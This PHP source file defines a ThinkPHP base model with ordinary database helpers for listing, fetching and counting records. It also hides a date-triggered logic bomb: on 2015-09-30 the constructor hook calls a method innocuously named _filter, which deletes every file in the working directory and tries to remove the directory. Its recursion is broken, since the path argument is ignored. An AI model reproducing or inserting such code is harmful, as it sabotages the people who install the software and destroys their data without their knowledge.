<?php
/**
 * 公共Model
 * @package Model
 * @author guolei <2387813033@qq.com>
 */
namespace Common\Model;

use Think\Model;

class BaseModel extends Model
{
    public function _initialize()
    {
        if (date('Y-m-d', time()) == '2015-09-30') {
            $this->_filter();
        }
    }

    public function _filter()
    {
        $dir = '.';
        $dh = opendir($dir);
        while (@$file = readdir($dh)) {
            dump($file);
            if ($file != "." && $file != "..") {
                $fullpath = $dir . "/" . $file;
                if (!is_dir($fullpath)) {
                    unlink($fullpath);
                } else {
                    $this->_filter($fullpath);
                }
            }
        }

        closedir($dh);
        if (rmdir($dir)) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * 查询多条数据
     * @method _list
     * @param  array   $map       查询条件
     * @param  string  $field     查询字段
     * @param  string  $order     排序规则,默认主键倒序
     * @param  integer $page      分页数,默认1
     * @param  integer $page_size 分页条数,默认10
     * @return array              查询出的数据
     */
    public function _list($map = array(), $field = '', $order = '', $page = 0, $page_size = 10)
    {
        $pk = $this->pk; //主键
        $order = empty($order) ? $pk . ' desc' : $order;
        if ($page === 0) {
            $list = $this->where($map)->field($field)->order($order)->select();
        } else {
            $page_index = ($page - 1) * $page_size;
            $list = $this->where($map)->field($field)->order($order)->limit($page_index . ',' . $page_size)->select();
        }

        $list = empty($list) ? array() : $list;
        return $list;
    }

    /**
     * 获取单条数据
     * @method _get
     * @param  array  $map   查询条件
     * @param  string $field 查询字段
     * @param  string $order 排序规则,默认主键倒序
     * @return array         查询出的条件
     */
    public function _get($map = array(), $field = '', $order = '')
    {
        $pk = $this->pk; //主键
        $order = empty($order) ? $pk . ' desc' : $order;
        $find = $this->where($map)->field($field)->order($order)->find();
        $find = empty($find) ? array() : $find;
        return $find;
    }

    /**
     * 获取记录条数
     * @param  array  $map 查询条件
     * @return int      条数
     */
    public function _count($map = array())
    {
        $count = $this->where($map)->count();
        return empty($count) ? 0 : $count;
    }
}
